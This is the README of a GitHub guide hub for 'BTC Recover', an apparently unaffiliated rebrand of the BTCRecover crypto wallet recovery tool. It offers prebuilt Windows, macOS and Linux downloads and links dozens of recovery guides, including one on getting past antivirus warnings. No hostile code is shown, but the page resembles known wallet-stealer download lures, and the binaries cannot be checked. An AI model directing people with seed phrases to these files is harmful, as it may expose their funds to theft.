<p align="center"><img src="https://github.com/btc-recover-tool/learn/raw/HEAD/assets/banner-hub.png" alt="BTC Recover guides" width="100%"></p>
<h1 align="center">BTC Recover Guides</h1>
<p align="center">Step-by-step help to get back into your crypto wallet, offline.</p>

<p align="center">
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-FBB034?style=for-the-badge&logo=windows&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Windows"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-FBB034?style=for-the-badge&logo=apple&logoColor=1C1E22&labelColor=1C1E22" alt="Download for macOS"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-FBB034?style=for-the-badge&logo=linux&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Linux"></a>
</p>

| Platform | Requirements | File |
|---|---|---|
| 🪟 Windows | Windows 10 or later, 64-bit | [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) |
| 🍎 macOS | macOS 10.13 High Sierra or later | [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) |
| 🐧 Linux | 64-bit (x86_64) distribution | [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) |

All versions and checksums are on the [v2.1.0 release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

> [!IMPORTANT]
> Only download from this GitHub release page.


---

## 📖 What this is

This repository is the learning hub for BTC Recover, the free and open-source tool that helps you get back into a wallet you are locked out of. Every guide here is written for one real problem: a seed word you cannot read, words in the wrong order, a password you only half remember, a passphrase you never wrote down, or an old wallet file from years ago. Each one explains what you will see, why it happens, a numbered fix, what to try if that does not work, and how to stop it happening again.

The guides are meant for owners recovering their own wallets. You do not need to be technical. Most people start with the point-and-click window, and the command line is there when you want every option. Nothing in these guides asks you to upload a seed, paste it into a website or share it with anyone, because BTC Recover never needs that. It works on your own computer, and we recommend switching off the internet after installing, before you type any seed word or open a wallet file.

## 🗂️ How the guides are grouped

The guides fall into six groups. **Install and setup** covers getting the right file for Windows, macOS or Linux, checking it and preparing a safe offline session. **Seed phrases** covers missing, misspelled and scrambled words, invalid phrase errors and wallets that look empty. **Passwords and passphrases** covers wallet files, BIP39 passphrases, token lists and typos. **Wallets** covers specific wallets such as Ledger, Trezor, Electrum, MetaMask, Blockchain.com, Bitcoin Core and MultiBit. **Performance and commands** covers graphics cards, the command line and making searches shorter. **Safety** covers fake downloads, antivirus warnings and estate recovery.

## ✅ How to verify a download

Before you run any installer, calculate its SHA-256 fingerprint and compare it with the value published on the [v2.1.0 release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0). On Windows use Get-FileHash in PowerShell, on macOS use shasum -a 256 in Terminal and on Linux use sha256sum. Every character must match. If it does not, delete the file and download it again from the release. A copy shared in a chat, a forum or a file-sharing link is never a substitute, because modified copies are a known way to steal seeds.

## ⏱️ A word on time

Some recoveries finish in seconds; others are very large. When a case is too large to predict, the tool says it can't estimate a reliable time instead of promising one. BTC Recover does not guarantee recovery, and these guides say so honestly.

BTC Recover is an independent project built on BTCRecover, created by Christopher Gurnee in 2014 and maintained by 3rdIteration. It is not affiliated with or endorsed by either.

---

## 🚀 Start here

[Install on Windows](https://github.com/btc-recover-tool/learn/blob/main/how-to/install-btc-recover-on-windows.md) · [Verify a download](https://github.com/btc-recover-tool/learn/blob/main/how-to/verify-btc-recover-download-sha256.md) · [First recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-first-recovery-walkthrough.md)

---

## Install and setup

| Guide | What it covers |
|---|---|
| [Install BTC Recover on Windows](https://github.com/btc-recover-tool/learn/blob/main/how-to/install-btc-recover-on-windows.md) | Download, check and install the Windows build step by step. |
| [Install BTC Recover on macOS](https://github.com/btc-recover-tool/learn/blob/main/how-to/install-btc-recover-on-macos.md) | Get the macOS disk image running safely on your Mac. |
| [Install BTC Recover on Linux](https://github.com/btc-recover-tool/learn/blob/main/how-to/install-btc-recover-on-linux.md) | Unzip and run the Linux build on a 64-bit distribution. |
| [Verify a BTC Recover download with SHA-256](https://github.com/btc-recover-tool/learn/blob/main/how-to/verify-btc-recover-download-sha256.md) | Check that your installer matches the published fingerprint. |
| [Run BTC Recover offline safely](https://github.com/btc-recover-tool/learn/blob/main/how-to/run-btc-recover-offline-safely.md) | Set up an offline session before touching any seed or wallet file. |
| [Your first BTC Recover recovery walkthrough](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-first-recovery-walkthrough.md) | A calm start-to-finish run for first-time users. |

## Seed phrases

| Guide | What it covers |
|---|---|
| [Recover a seed phrase with BTC Recover](https://github.com/btc-recover-tool/learn/blob/main/how-to/recover-seed-phrase-with-btc-recover.md) | Rebuild a damaged or partly lost recovery phrase. |
| [Find missing seed words with BTC Recover](https://github.com/btc-recover-tool/learn/blob/main/how-to/find-missing-seed-words-btc-recover.md) | Recover one, two or three missing words from a phrase. |
| [Fix seed words in the wrong order with BTC Recover](https://github.com/btc-recover-tool/learn/blob/main/how-to/fix-seed-words-wrong-order-btc-recover.md) | Recover a phrase whose words are all there but scrambled. |
| [Fix an invalid recovery phrase with BTC Recover](https://github.com/btc-recover-tool/learn/blob/main/how-to/fix-invalid-recovery-phrase-btc-recover.md) | Find the word causing an invalid phrase error. |
| [BTC Recover for one missing seed word](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-one-missing-seed-word.md) | The fastest case: one word gone from your phrase. |
| [BTC Recover for a misspelled seed word](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-misspelled-seed-word.md) | Recover from a typo in a written seed phrase. |
| [BTC Recover 24-word seed recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-24-word-seed-recovery.md) | What changes when your phrase is 24 words long. |
| [BTC Recover BIP39 word list guide](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-bip39-word-list-guide.md) | How the 2,048-word list helps you check a phrase. |
| [BTC Recover derivation path for an empty wallet](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-derivation-path-empty-wallet.md) | Find funds when the right phrase shows a zero balance. |
| [BTC Recover seed recovery time estimate](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-seed-recovery-time-estimate.md) | Understand how long a seed search may take. |

## Passwords and passphrases

| Guide | What it covers |
|---|---|
| [Recover a wallet password with BTC Recover](https://github.com/btc-recover-tool/learn/blob/main/how-to/recover-wallet-password-btc-recover.md) | Rebuild a half-remembered wallet password. |
| [BTC Recover BIP39 passphrase recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-bip39-passphrase-recovery.md) | Recover the extra passphrase on top of a seed. |
| [BTC Recover wallet.dat password recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-wallet-dat-password.md) | Open a Bitcoin Core wallet.dat with a forgotten password. |
| [BTC Recover password token list](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-password-token-list.md) | Turn your memories into a focused search list. |
| [BTC Recover typo password recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-typo-password-recovery.md) | Recover a password you typed wrong when setting it. |
| [Decrypt a BIP38 key with BTC Recover](https://github.com/btc-recover-tool/learn/blob/main/how-to/decrypt-bip38-key-btc-recover.md) | Recover the password of an encrypted paper wallet. |
| [BTC Recover Electrum password recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-electrum-password.md) | Unlock an Electrum wallet file you cannot open. |
| [BTC Recover MetaMask vault password](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-metamask-vault-password.md) | Recover the password on a MetaMask browser vault. |

## Wallets

| Guide | What it covers |
|---|---|
| [BTC Recover Ledger seed recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-ledger-seed-recovery.md) | Recover a Ledger recovery phrase with missing words. |
| [BTC Recover Trezor passphrase recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-trezor-passphrase-recovery.md) | Recover a Trezor hidden wallet passphrase. |
| [BTC Recover Electrum wallet recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-electrum-wallet-recovery.md) | Recover an Electrum wallet from a file or seed. |
| [BTC Recover MetaMask wallet recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-metamask-wallet-recovery.md) | Paths back into a MetaMask wallet. |
| [BTC Recover Blockchain.com wallet recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-blockchain-com-wallet.md) | Recover an old Blockchain.com wallet password. |
| [BTC Recover Bitcoin Core wallet recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-bitcoin-core-wallet.md) | Recover access to a Bitcoin Core wallet. |
| [BTC Recover MultiBit wallet recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-multibit-wallet-recovery.md) | Open an old MultiBit wallet file. |
| [BTC Recover for an old bitcoin wallet](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-old-bitcoin-wallet.md) | Get back into a wallet from years ago. |

## Performance and commands

| Guide | What it covers |
|---|---|
| [BTC Recover GPU acceleration with OpenCL](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-gpu-acceleration-opencl.md) | Use your graphics card to speed up searches. |
| [BTC Recover command line examples](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-command-line-examples.md) | Use the full command line engine. |
| [Speed up a BTC Recover search](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-speed-up-search.md) | Make long searches shorter. |
| [BTC Recover window vs command line](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-gui-vs-command-line.md) | Pick between the window and the terminal. |

## Safety

| Guide | What it covers |
|---|---|
| [Is BTC Recover safe?](https://github.com/btc-recover-tool/learn/blob/main/how-to/is-btc-recover-safe.md) | What makes a recovery tool safe to use. |
| [Avoid fake BTC Recover downloads](https://github.com/btc-recover-tool/learn/blob/main/how-to/avoid-fake-btc-recover-downloads.md) | Spot and avoid modified copies. |
| [BTC Recover estate wallet recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-estate-wallet-recovery.md) | Recover a wallet left by a family member. |
| [BTC Recover antivirus warning fix](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-antivirus-warning-fix.md) | What to do when antivirus flags the installer. |

---

## ℹ️ About

Guides for [BTC Recover](https://github.com/btc-recover-tool/BTC-Recover). Downloads live on the [release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

## 📄 License

GPL-2.0. See [LICENSE](https://github.com/btc-recover-tool/learn/blob/main/LICENSE).
